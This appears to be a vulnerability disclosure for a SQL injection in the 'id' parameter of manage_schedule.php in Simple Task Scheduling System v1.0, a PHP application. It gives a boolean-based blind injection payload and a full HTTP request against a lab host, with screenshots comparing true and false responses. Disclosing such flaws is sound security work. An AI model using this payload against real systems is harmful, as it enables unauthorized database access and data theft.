# Simple Task Scheduling System v1.0 by oretnom23 has SQL injection

BUG_Author: RUST

vendors: https://www.sourcecodester.com/php/15328/simple-task-scheduler-system-phpoop-free-source-code.html

The program is built using the xmapp-php5.6 version

Vulnerability File: /tss/admin/schedules/manage_schedule.php

Vulnerability location: /tss/admin/schedules/manage_schedule.php, id

db_name = tss_db;length=6

[+] Payload: /tss/admin/schedules/manage_schedule.php?id=1%27%20and%20length(database())%20=6--+ // Leak place ---> id

```sql
GET /tss/admin/schedules/manage_schedule.php?id=1%27%20and%20length(database())%20=6--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=tc6akb10bh652defck09t9eug4
Connection: close
```

When length (database ()) = 6
![image](https://user-images.githubusercontent.com/54017627/179392434-cdb930dd-0cb2-425f-9975-592201214bcc.png)

When length (database ()) = 5
![image](https://user-images.githubusercontent.com/54017627/179392439-7df9acf7-97f0-4698-bd34-5c03b5b17517.png)
